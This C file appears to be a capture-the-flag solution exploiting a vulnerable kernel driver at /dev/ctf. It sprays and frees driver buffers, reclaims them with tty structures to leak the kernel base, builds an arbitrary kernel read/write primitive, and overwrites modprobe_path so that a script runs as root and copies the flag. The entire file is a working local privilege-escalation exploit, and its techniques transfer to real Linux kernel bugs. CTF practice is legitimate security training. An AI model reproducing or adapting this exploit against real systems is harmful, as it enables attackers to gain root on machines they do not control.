#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/mman.h>
#include <sys/timerfd.h>
#include <sched.h>
#include <signal.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/resource.h>

#define TTY_MAGIC		0x5401

int arw_ctl = -1;
int arw_fd = -1;

void kread(uint64_t addr, void *buf, size_t len) {
	assert(arw_ctl != -1);
	assert(arw_fd != -1);
	uint64_t data[2];
	data[0] = addr;
	data[1] = len;
	write(arw_ctl, data, 16);
	read(arw_fd, buf, len);
}

void kwrite(uint64_t addr, void *buf, size_t len) {
	assert(arw_ctl != -1);
	assert(arw_fd != -1);
	uint64_t data[2];
	data[0] = addr;
	data[1] = len;
	write(arw_ctl, data, 16);
	write(arw_fd, buf, len);
}

uint64_t kread64(uint64_t addr) {
	uint64_t value;
	kread(addr, &value, 8);
	return value;
}

void kwrite64(uint64_t addr, uint64_t value) {
	kwrite(addr, &value, 8);
}
int main()
{
	int fds[0x40];
	int ttys[0x40];
	uint64_t kbase = 0;
	for (int i = 0; i < 0x40; i++) {
		fds[i] = open("/dev/ctf", O_RDWR);
		assert(fds[i] >= 0);
		assert(ioctl(fds[i], 1337, 1024) >= 0);
	}

	for (int i = 0; i < 0x40; i++) {
		/* Free all data */
		assert(ioctl(fds[i], 1338, 0) >= 0);
	}

	for (int i = 0; i < 0x40; i++) {
		ttys[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
		assert(ttys[i] >= 0);
	}
	
	for (int i = 0; i < 0x40; i++) {
		uint32_t magic = 0;
		read(fds[i], &magic, 4);
		if (magic == TTY_MAGIC) {
			printf("[+] Found TTY_MAGIC @ 0x%x\n", i);
			/* There is also an ops that ends with 4c0
			 * but the one that will trigger direct is 5e0
			 */
			uint64_t data[128];
			read(fds[i], data, 1024);
			if ((data[3] & 0xfff) == 0x5e0) {
				#if 0
				for (int i = 0; i < 128; i++) {
					fprintf(stderr, "+0x%x: 0x%llx\n", i * 8, data[i]);
				}	
				fprintf(stderr, "\n");
				fflush(stderr);
				#endif
				kbase = data[3] - 0x10745e0;
			}
		}
	}
	assert(kbase);
	uint64_t slide = kbase - 0xffffffff81000000;
	printf("[+] kbase: 0x%llx\n", kbase);
	printf("[+] slide: 0x%llx\n", slide);

	for (int i = 0; i < 0x40; i++) {
		close(fds[i]);
		fds[i] = -1;
		close(ttys[i]);
		ttys[i] = -1;
	}

	for (int i = 0; i < 0x40; i++) {
		fds[i] = open("/dev/ctf", O_RDWR);
		assert(fds[i] >= 0);
		assert(ioctl(fds[i], 1337, 16) >= 0);
	}
	
	for (int i = 0; i < 0x40; i++) {
		/* Free all data */
		assert(ioctl(fds[i], 1338, 0) >= 0);
	}
	
	int victims[0x40];
	for (int i = 0; i < 0x40; i++) {
		victims[i] = open("/dev/ctf", O_RDWR);
		assert(victims[i] >= 0);
		assert(ioctl(victims[i], 1337, 1337 + i) >= 0);
	}
	for (int i = 0; i < 0x40; i++) {
		uint64_t data[2];
		read(fds[i], data, 16);
		if (data[1] < 1337 || data[1] >= 1337 + 0x40) continue;
		fprintf(stderr, "[*] Found ctf_data at index: 0x%x(0x%llx)\n", i, data[1] - 1337);
		for (int i = 0; i < 2; i++) {
			fprintf(stderr, "+0x%x: 0x%llx\n", i * 8, data[i]);
		}
		arw_ctl = fds[i];
		arw_fd = victims[data[1] - 1337];
		fprintf(stderr, "\n");
		break;
	}
	assert(arw_ctl != -1);
	assert(arw_fd != -1);

	printf("[+] Got Kernel R/W fd: 0x%x/0x%x\n", arw_ctl, arw_fd);
	printf("[*] kread64(kbase): 0x%llx\n", kread64(kbase));

	int fd = creat("/tmp/x", 0777);
	dprintf(fd, "#!/bin/sh\ncp /dev/vdb /tmp/flag\nchmod 777 /tmp/flag");
	close(fd);

	fd = creat("/tmp/dummy", 0777);
	write(fd, "\xff\xff\xff\xff", 4);
	close(fd);
	
	kwrite(kbase + 0x144dd40, "/tmp/x\x00", 7);
	system("/tmp/dummy");
	system("cat /tmp/flag");
	
	kwrite(kbase + 0x144dd40, "/sbin/modprobe\x00", 0xe);
}
